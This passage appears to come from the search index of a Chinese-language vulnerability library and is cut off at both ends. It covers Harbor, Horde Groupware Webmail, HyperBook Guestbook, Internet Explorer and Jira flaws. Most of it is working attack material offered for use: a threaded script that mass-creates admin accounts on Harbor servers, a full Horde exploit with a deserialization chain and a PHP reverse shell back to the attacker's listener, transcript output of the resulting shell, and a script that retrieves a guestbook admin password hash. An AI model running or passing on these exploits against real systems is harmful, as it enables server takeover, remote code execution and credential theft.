f7\u4f7f\u7528\u5230\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_3","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Harbor\u662f\u4e00\u4e2a\u7528\u4e8e\u5b58\u50a8\u548c\u5206\u53d1Docker\u955c\u50cf\u7684\u4f01\u4e1a\u7ea7Registry\u670d\u52a1\u5668\u3002Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c\u4e2d\u7684core/api/user.go\u6587\u4ef6\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u901a\u8fc7\u5728\u8bf7\u6c42\u4e2d\u6dfb\u52a0\u5173\u952e\u53c2\u6570\uff0c\u5373\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_4","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_5","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u6211\u4eec\u901a\u8fc7\u7f16\u5199\u6279\u91cf\u9a8c\u8bc1\u811a\u672c\uff0c\u6210\u529f\u590d\u73b0\u4e86\u8be5\u6f0f\u6d1e\u3002 \u811a\u672cgithub\u83b7\u53d6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_6","title":"\u5b89\u5168\u5efa\u8bae","text":"<p>\u5347\u7ea7Harbor\u7248\u672c\u5230 1.7.6 \u548c 1.8.3</p> <p>\u53c2\u8003\u4e0b\u8f7d\u94fe\u63a5\uff1ahttps://github.com/goharbor/harbor/releases</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_7","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://github.com/evilAdan0s/CVE-2019-16097</p> <p>https://github.com/goharbor/harbor/issues/8951</p> <p>https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/","title":"Harbor\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u4e0d\u53d7\u5f71\u54cd\u7248\u672c","text":"<p>Harbor&gt;= 1.7.6</p> <p>Harbor&gt;= 1.8.3</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u590d\u73b0\u4e4b\u73af\u5883\u51c6\u5907","text":"<p>1.Cenos7\u5b89\u88c5\u597ddocker\u548cdocker-compose 2.\u4e0b\u8f7d\u5e76\u5b89\u88c5harbor1.8.1\u5728\u7ebf\u5b89\u88c5\u7248\u672c</p> <pre><code>wget https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz\n\ntar xvf harbor-online-installer-v1.8.0.tgz\n\ncd harbor\n\nvi harbor.yml\n</code></pre> <p>\u4fee\u6539hostname\u4e3a\u5b89\u88c5Harbor\u673a\u5668\u7684IP\u5730\u5740\u3002  \u5b89\u88c5harbor ./install.sh</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u6ce8\u518c\u4e00\u4e2aHarbor\u5e10\u53f7\uff0c\u586b\u5199\u5bc6\u7801\u65f6\u6ce8\u610f\u8981\u7b26\u5408\u89c4\u8303  \u5bf9\u6ce8\u518c\u4fe1\u606f\u8fdb\u884c\u6293\u5305\u4fee\u6539\uff0c\u5728post\u6570\u636e\u540e\u9762\u6dfb\u52a0\u201dhas_admin_role\u201d:true \u67e5\u770b[Response]\uff0c\u8fd4\u56de201,\u8bf4\u660e\u5199\u5165\u6210\u529f\u3002 \u4f7f\u7528admin\u5e10\u53f7\u8fdb\u5165\u540e\u53d1\u73b0\uff0c\u5df2\u7ecf\u6210\u529f\u5199\u5165\u5e10\u53f7\uff0c\u5e76\u4e14\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#poc","title":"\u6279\u91cf\u5229\u7528poc","text":"<pre><code>import requests\nimport threading\nimport logging\n\ndata='{\"username\":\"biubiubiu\",\"email\":\"biubiubiu11@qq.com\",\"realname\":\"biubiu1biu\",\"password\":\"Aa111111\",\"comment\":\"biubiubiu\",\"has_admin_role\":true}'\n\nheaders={\"Content-Type\": \"application/json\"}\n\ndef poc(url):\n    pwn_url=url+\"/api/users\"\n    payload=data\n    try:\n        r=requests.post(pwn_url, data=payload,headers=headers,timeout=10)\n        print(pwn_url)\n        print(r.status_code)\n        if r.status_code == 201:\n            print(\"\\n\\n you has created a user,username=biubiubiu,password=Aa111111\")\n            f.write(url+\"       The URL has created a user,username=biubiubiu,password=Aa111111\")\n        else:\n            print(\"The vulnerability does not exist on the website or the account name has been written\")\n\n    except Exception as e:\n        logging.warning(pwn_url)\n        print(e)\n\nif __name__ == '__main__':\n    print (\"this is a CVE-2019-16097 poc\")\n    print(\"more cve-2019-16097 info welcome to https://www.lstazl.com\")\n    f=open(\"results.txt\",\"a\")\n    url_list=[i.replace(\"\\n\",\"\") for i in open(\"urls.txt\",\"r\").readlines()]\n    for url in url_list:\n        threading.Thread(target=poc,args=(url,)).start()\n        while 1:\n            if (len(threading.enumerate())&lt;50):\n                break\n</code></pre> <p>1.\u5728urls.txt\u4e2d\u6dfb\u52a0\u4f60\u8981\u68c0\u6d4b\u7684url</p> <p>2.python3\u73af\u5883\u4e0b\u8fd0\u884ccve-2019-16097\u811a\u672c python3 cve-2019-16097.py</p> <p>3.\u6279\u91cf\u68c0\u6d4b\u5b8c\u6210\u540e\u518dresults\u4e2d\u67e5\u770b\u6210\u529f\u5199\u5165\u8d26\u53f7\u7684url\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Horde%20Groupware/Horde%20Groupware%20Webmail%205.2.22%E4%BD%8E%E6%9D%83%E9%99%90RCE%E6%BC%8F%E6%B4%9E/","title":"0x00 \u7b80\u4ecb","text":"<p>Horde Groupware Webmail\u662f\u7f8e\u56fdHorde\u516c\u53f8\u7684\u4e00\u5957\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u4f01\u4e1a\u7ea7\u901a\u4fe1\u5957\u4ef6\u3002 Horde Groupware  Webmail\u4e2d\u5b58\u5728\u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5916\u90e8\u8f93\u5165\u6570\u636e\u6784\u9020\u4ee3\u7801\u6bb5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u672a\u6b63\u786e\u8fc7\u6ee4\u5176\u4e2d\u7684\u7279\u6b8a\u5143\u7d20\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u751f\u6210\u975e\u6cd5\u7684\u4ee3\u7801\u6bb5\uff0c\u4fee\u6539\u7f51\u7edc\u7cfb\u7edf\u6216\u7ec4\u4ef6\u7684\u9884\u671f\u7684\u6267\u884c\u63a7\u5236\u6d41\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Horde%20Groupware/Horde%20Groupware%20Webmail%205.2.22%E4%BD%8E%E6%9D%83%E9%99%90RCE%E6%BC%8F%E6%B4%9E/#0x01","title":"0x01 \u6f0f\u6d1e\u8be6\u60c5","text":"<p>ZDI-20-1051 ZDI-CAN-10436</p> <p>\u6b64\u6f0f\u6d1e\u4f7f\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53d7\u5f71\u54cd\u7684Horde Groupware Webmail Edition\u5b89\u88c5\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u5229\u7528\u8eab\u4efd\u9a8c\u8bc1\u624d\u80fd\u5229\u7528\u6b64\u6f0f\u6d1e\u3002</p> <p>\u5177\u4f53\u7f3a\u9677\u5b58\u5728\u4e8eSort.php\u4e2d\u3002\u89e3\u6790sortpref\u53c2\u6570\u65f6\uff0c\u8be5\u8fc7\u7a0b\u65e0\u6cd5\u6b63\u786e\u9a8c\u8bc1\u7528\u6237\u63d0\u4f9b\u7684\u6570\u636e\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u4e0d\u4fe1\u4efb\u6570\u636e\u7684\u53cd\u5e8f\u5217\u5316\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u5728www-data\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Horde%20Groupware/Horde%20Groupware%20Webmail%205.2.22%E4%BD%8E%E6%9D%83%E9%99%90RCE%E6%BC%8F%E6%B4%9E/#0x02","title":"0x02 \u5229\u7528\u5de5\u5177","text":"<pre><code>import re\nimport sys\nimport socket\nimport requests\nimport telnetlib\nimport base64\nfrom threading import Thread\n\ndef rs(cbh, cbp):\n    return \"\"\"@error_reporting(-1);\n@set_time_limit(0); \n@ignore_user_abort(1);\n$dis=@ini_get('disable_functions');\nif(!empty($dis)){\n    $dis=preg_replace('/[, ]+/', ',', $dis);\n    $dis=explode(',', $dis);\n    $dis=array_map('trim', $dis);\n}else{\n    $dis=array();\n}\n$ipaddr='%s';\n$port=%d;\nfunction PtdSlhY($c){\n    global $dis; \n    if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {\n        $c=$c.\" 2&gt;&amp;1\\\\n\";\n    }\n    ob_start();\n    system($c);\n    $o=ob_get_contents();\n    ob_end_clean();\n    if (strlen($o) === 0){\n        $o = \"NULL\";\n    }\n    return $o;\n}\n$nofuncs='no exec functions';\n$s=@fsockopen(\"tcp://$ipaddr\",$port);\nwhile($c=fread($s,2048)){\n    $out = '';\n    if(substr($c,0,3) == 'cd '){\n        chdir(substr($c,3,-1));\n    }else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {\n        break;\n    }else{\n        $out=PtdSlhY(substr($c,0,-1));\n        if($out===false){\n            fwrite($s, $nofuncs);\n            break;\n        }\n    }\n    fwrite($s,$out);\n}\nfclose($s);\"\"\" % (cbh, cbp)\n\ndef get_session(t, p, usr, pwd):\n    uri = \"http://%s%slogin.php\" % (t, p)\n    p = {\n        \"login_post\" : 1337,\n        \"horde_user\" : usr,\n        \"horde_pass\" : pwd\n    }\n    r = requests.post(uri, data=p, allow_redirects=False)\n    match = re.findall(\"Horde=(.{26});\", r.headers['set-cookie'])\n    assert len(match) == 2, \"(-) failed to login\"\n    return match[1]\n\ndef trigger_deserialization(t, p, s, host, port):\n    \"\"\" Object instantiation to reach the deserialization \"\"\"\n    handlerthr = Thread(target=handler, args=(port,))\n    handlerthr.start()\n    uri = \"http://%s%sservices/ajax.php/imp/imple\" % (t, p)\n    p = {\n        \"imple\" : \"IMP_Prefs_Sort\",\n        \"app\" : \"imp\",\n    }\n    h = { \"cmd\" : base64.b64encode(rs(host, port).encode()) }\n    c = { \"Horde\" : s }\n    r = requests.get(uri, params=p, cookies=c, headers=h)\n    match = re.search(\"horde_logout_token=(.*)&amp;\", r.text)\n    assert match, \"(-) failed to leak the horde_logout_token!\"\n    p['token'] = match.group(1)\n    r = requests.get(uri, params=p, cookies=c, headers=h)\n    assert r.status_code == 200, \"(-) failed to trigger deserialization!\"\n\ndef get_pop():\n    \"\"\" An updated pop chain \"\"\"\n    pop  = 'O:34:\"Horde_Kolab_Server_Decorator_Clean\":2:{'\n    pop += 'S:43:\"\\\\00Horde_Kolab_Server_Decorator_Clean\\\\00_server\";O:20:\"Horde_Prefs_Identity\":3:{'\n    pop += 'S:9:\"\\\\00*\\\\00_prefs\";O:11:\"Horde_Prefs\":2:{'\n    pop += 'S:8:\"\\\\00*\\\\00_opts\";a:1:{'\n    pop += 's:12:\"sizecallback\";a:2:{i:0;O:12:\"Horde_Config\":1:{'\n    pop += 'S:13:\"\\\\00*\\\\00_oldConfig\";s:44:\"eval(base64_decode($_SERVER[HTTP_CMD]));die;\";'\n    pop += '}i:1;s:13:\"readXMLConfig\";}}'\n    pop += 'S:10:\"\\\\00*\\\\00_scopes\";a:1:{'\n    pop += 's:5:\"horde\";C:17:\"Horde_Prefs_Scope\":10:{[null,[1]]}}}'  # implements Serializable using custom unserialize/serialize\n    pop += 'S:13:\"\\\\00*\\\\00_prefnames\";a:1:{s:10:\"identities\";i:0;}'\n    pop += 'S:14:\"\\\\00*\\\\00_identities\";a:1:{i:0;i:0;}}'             # additional checks\n    pop += 'S:42:\"\\\\00Horde_Kolab_Server_Decorator_Clean\\\\00_added\";a:1:{i:0;i:0;}}'\n    return pop\n\ndef get_patch():\n    \"\"\" Our original array \"\"\"\n    patch  = 'a:1:{'\n    patch += 's:5:\"INBOX\";a:1:{'\n    patch += 's:1:\"b\";i:6;'\n    patch += '}}'\n    return patch\n\ndef set_pref(t, p, s, k, o):\n    \"\"\" A primitive that inserts a string into the database \"\"\"\n    uri = \"http://%s%sservices/ajax.php/imp/setPrefValue\" % (t, p)\n    p = {\n        \"pref\" : k,\n        \"value\" : o,\n    }\n    c = { \"Horde\" : s }\n    r = requests.get(uri, params=p, cookies=c)\n    match = re.search(\"horde_logout_token=(.*)&amp;\", r.text)\n    assert match, \"(-) failed to leak the horde_logout_token!\"\n    p['token'] = match.group(1)\n    r = requests.get(uri, params=p, cookies=c)\n    assert (\"\\\"response\\\":true\" in r.text and r.status_code == 200), \"(-) failed to set the preference!\"\n\ndef handler(lport):\n    print(\"(+) starting handler on port %d\" % lport)\n    t = telnetlib.Telnet()\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind((\"0.0.0.0\", lport))\n    s.listen(1)\n    conn, addr = s.accept()\n    print(\"(+) connection from %s\" % addr[0])\n    t.sock = conn\n    print(\"(+) pop thy shell!\")\n    t.interact()\n\ndef fix_path(p):\n    if p == \"/\":\n        return p\n    if not p.startswith(\"/\"):\n        p = \"/%s\" % p\n    if not p.endswith(\"/\"):\n        p = \"%s/\" % p\n    return p\n\ndef main():\n    if len(sys.argv) &lt; 5:\n        print(\"(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;\" % sys.argv[0])\n        print(\"(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337\" % sys.argv[0])\n        sys.exit(0)\n    target = sys.argv[1]\n    path   = fix_path(sys.argv[2])\n    user   = sys.argv[3].split(\":\")[0]\n    pswd   = sys.argv[3].split(\":\")[1]\n    host   = sys.argv[4].split(\":\")[0]\n    port   = int(sys.argv[4].split(\":\")[1])\n    print(\"(+) targeting http://%s%s\" % (target, path))\n    session = get_session(target, path, user, pswd)\n    print(\"(+) obtained session %s\" % session)\n    set_pref(target, path, session, 'sortpref', get_pop())\n    print(\"(+) inserted our php object\")\n    print(\"(+) triggering deserialization...\")\n    trigger_deserialization(target, path, session, host, port)\n    set_pref(target, path, session, 'sortpref', get_patch())\n    print(\"(+) repaired the target!\")\n\nif __name__ == \"__main__\":\n    main()\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Horde%20Groupware/Horde%20Groupware%20Webmail%205.2.22%E4%BD%8E%E6%9D%83%E9%99%90RCE%E6%BC%8F%E6%B4%9E/#0x03-references","title":"0x03 references","text":"<p>https://www.zerodayinitiative.com/advisories/ZDI-20-1051/ https://srcincite.io/pocs/zdi-20-1051.py.txt</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Horde%20Groupware/Horde%20Groupware%20Webmail%20Edition%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"Horde Groupware Webmail Edition \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":"<pre><code>saturn:~$./poc.py 172.16.175.148/horde/ hordeuser:pass123 172.16.175.145\n(+) targeting http://172.16.175.145/horde/\n(+) obtained session iefankvohbl8og0mtaadm3efb6\n(+) inserted our php object\n(+) triggering deserialization...\n(+) starting handler on port 1337\n(+) connection from 172.16.175.145\n(+) pop thy shell!\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\npwd\n/var/www/horde/services \n</code></pre> <pre><code>poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1-P-9IUMpHKZDIXELIFIOJg \u63d0\u53d6\u7801\uff1adgne\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/HyperBook%20Guestbook/HyperBook%20Guestbook%201.3%20GBConfiguration.DAT%20Hashed%20Password%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"HyperBook Guestbook 1.3 GBConfiguration.DAT Hashed Password\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"<p>HyperBook Guestbook is prone to an information-disclosure vulnerability because the application fails to protect sensitive information.</p> <p>An attacker can exploit this issue to access sensitive information that may lead to other attacks.</p> <p>This issue affects version 1.3.0; other versions may also be affected.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/HyperBook%20Guestbook/HyperBook%20Guestbook%201.3%20GBConfiguration.DAT%20Hashed%20Password%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#usrbinpython","title":"!/usr/bin/python","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/HyperBook%20Guestbook/HyperBook%20Guestbook%201.3%20GBConfiguration.DAT%20Hashed%20Password%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#script-hyperbook-guestbook-v130-qbconfigurationdat-remote-admin-md5-hash-exploit","title":"Script                  :HyperBook Guestbook v1.30 (qbconfiguration.dat) Remote Admin md5 Hash Exploit","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/HyperBook%20Guestbook/HyperBook%20Guestbook%201.3%20GBConfiguration.DAT%20Hashed%20Password%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#exploit-coded-by-petro","title":"Exploit Coded by        : PeTrO","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/HyperBook%20Guestbook/HyperBook%20Guestbook%201.3%20GBConfiguration.DAT%20Hashed%20Password%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#exploit-discovered-by-sao-wwwsaohackstylecom","title":"Exploit Discovered by   : SaO [www.saohackstyle.com]","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/HyperBook%20Guestbook/HyperBook%20Guestbook%201.3%20GBConfiguration.DAT%20Hashed%20Password%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#credits-to-soulreaverkuzey","title":"Credits to              :[soulreaver],Kuzey","text":"<p>import urllib import sys import parser</p> <p>serv=\"http://\" i=0 for arg in sys.argv:      i=i+1</p> <p>if i!=3:  print \"\"\"\\n\\n          \\tHyperBook Guestbook v1.30  (qbconfiguration.dat)           \\t\\t    Remote Admin md5 Hash Exploit            \\t                                     \\tUsage:Exploit.py [targetsite] [path]            \\tExample:Exploit.py www.target.com /guestbook/\\n\\n\"\"\" else:</p> <pre><code>adres=sys.argv[1]\npath=sys.argv[2]\n\nstr1=adres.join([serv,path])\nstr2=str1.join([&amp;#39;&amp;#39;,&amp;#39;data/gbconfiguration.dat&amp;#39;])\n\nprint &amp;#34;\\n[~]Connecting...&amp;#34;\nurl=urllib.urlopen(str2).read(); \nprint &amp;#34;\\n[+]Connected!&amp;#34;\n\ntest=url.find(path);\n\nt=0;\nprint &amp;#34;\\n\\t\\t\\t-=[Admin md5 hash]=-&amp;#34;\nwhile(url[test+1]!=1): #parsing hash... by PeTrO..\n          print url[test],\n\n          if(url[test]==&amp;#39;\\n&amp;#39;):\n             t=t+1;\n\n          if(t==2):\n             break;\n\n          test=test+1;\n\nprint &amp;#34;\\n\\n\\t\\t\\t[ c0ded by PeTrO ]&amp;#34;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"IE\u6d4f\u89c8\u5668\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"<p>\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-1092 \u6f0f\u6d1e\u7ea7\u522b\uff1a\u9ad8\u5371 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0\uff1a","text":"<p>IE9\u548cIE11\u7248\u672c\u4e2d\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u672a\u80fd\u6b63\u786e\u8bbf\u95ee\u5185\u5b58\u5bf9\u8c61\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u7834\u574f\u5185\u5b58\u3002 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u5f71\u54cd\u8303\u56f4\uff1a","text":"<p>IE9\u548cIE11 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u7f13\u89e3\u63aa\u65bd\uff1a","text":"<p>\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\uff0c\u8865\u4e01\u83b7\u53d6\u5730\u5740\uff1a https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisor/CVE-2020-1092</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"Atlassian Jira\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u6982\u8981","text":"<p>\u200b    </p> <p>**\u6f0f\u6d1e\u540d\u79f0\uff1a**Atlassian Jira\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1eCVE-2020-14181</p> <p>**\u5a01\u80c1\u7b49\u7ea7\uff1a**\u4e2d\u5371</p> <p>\u5f71\u54cd\u8303\u56f4\uff1a</p> <p>Jira &lt; 7.13.6</p> <p>Jira 8.0.0 - 8.5.7</p> <p>Jira 8.6.0 - 8.12.0</p> <p>**\u6f0f\u6d1e\u7c7b\u578b\uff1a**\u4fe1\u606f\u6cc4\u9732</p> <p>**\u5229\u7528\u96be\u5ea6\uff1a**\u7b80\u5355</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u200b    </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/Atlassian%20Jira%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#21-jira","title":"2.1 